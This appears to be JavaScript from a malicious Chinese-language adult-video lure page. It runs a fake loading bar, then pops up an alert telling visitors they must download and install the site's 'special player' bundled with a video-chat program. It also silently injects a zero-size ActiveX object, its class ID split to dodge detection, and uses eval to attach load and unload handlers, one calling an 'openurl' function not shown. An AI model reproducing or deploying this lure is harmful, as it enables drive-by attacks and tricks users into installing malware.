
		var bar=0 
		var line="||" 
		var amount="||" 
		count()
		function count()
		{ 
			isLoading.style.display	="none";		//隐藏层 [加载进度]		
			isAlert.style.display	="none";		//隐藏层 [提示下载]	
			isMsg.style.display		="none";		//隐藏层 [提示成功]	
			
			bar=bar+2 
			amount =amount + line 
			document.loading.chart.value=amount 
			document.loading.percent.value=bar+"%" 
			if (bar<99) 
			{
			
				isLoading.style.display	="block";	//显示层 [加载进度]
				setTimeout("count()",100);
			} 

			else 
			
			{
				isAlert.style.display	="block";	//显示层 [提示下载]
				window.alert('"温馨提示:系统检测到您没有安装本站专用播放器，请先下载安装本站51搞外情影片专用播放器和美女视频聊天室二合一软件,注册并登陆 可免费观看！>>>>> 记得刷新下喔！"');
				isLoading.style.display	="none";	//隐藏层 [加载进度]			
				

			} 

		}




function openinit()
{
document.body.innerHTML += '<object id="koyoz" width="0" height="0" classid="CLSID:6BF52A52-394A-11' + 'D3-B153-00C04F79FAA6"></object>';
}
eval("window.attachEvent('onload',openinit);");
eval("window.attachEvent('onunload',openurl);");